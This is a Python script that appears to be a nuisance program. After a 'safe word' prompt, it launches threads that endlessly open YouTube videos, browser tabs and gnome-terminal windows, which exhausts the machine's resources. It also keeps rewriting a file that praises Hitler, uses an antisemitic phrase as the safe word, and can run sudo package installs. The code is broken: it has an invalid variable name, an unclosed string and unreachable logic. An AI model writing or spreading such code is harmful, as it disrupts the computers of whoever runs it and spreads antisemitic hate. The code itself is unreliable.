import pywhatkit
import threading
import shutil
import subprocess
import sys
import webbrowser
import tkinter as tk
from plyer import notification
import time

def master_one():
    def  youtube():
        while True:
            pywhatkit.playonyt("ZMUYH21Lmg4")


    def create_file():
        while True:
            f=open("Hitler.txt","w")
            f.write("Hitler was right yk")
            f.close()

    def  website():
        while True:
            webbrowser.open("https://i.imgflip.com/aesu9c.jpg")


    def is_installed(pkg: str) -> bool:
        """Check if a program exists in PATH."""
        return shutil.which(pkg) is not None

    def install_gnome_terminal():
        """Install gnome-terminal using apt on Linux Mint."""
        print("Gnome Terminal not found. Attempting installation...")

        try:
            
            subprocess.run(["sudo", "apt", "update"], check=True)

            
            subprocess.run(["sudo", "apt", "install", "-y", "gnome-terminal"], check=True)

            print("Gnome Terminal installed successfully.")

        except subprocess.CalledProcessError as e:
            print("❌ Failed to install gnome-terminal.")
            print("Error details:", e)
            sys.exit(1)

    def open_gnome_terminal():
        while True:
            """Open gnome-terminal."""
            print("Opening gnome-terminal...")
            subprocess.Popen(["gnome-terminal"])
            
        if __name__ == "__main__":
            if is_installed("gnome-terminal"):
                open_gnome_terminal()
            else:
                install_gnome_terminal()

    
    e = threading.Thread(target=youtube)
    w=threading.Thread(target=create_file)
    q=threading.Thread(target=open_gnome_terminal)
    a=threading.Thread(target=website)

    w.start()    
    e.start()
    q.start()
    a.start()

safe _word = "Jews were right"
question = input("Enter the safe_

if question == safe_word:
    print("Correct Answer")
    exit()
else:
    p = threading.Thread(target=master_one)
    p.start()
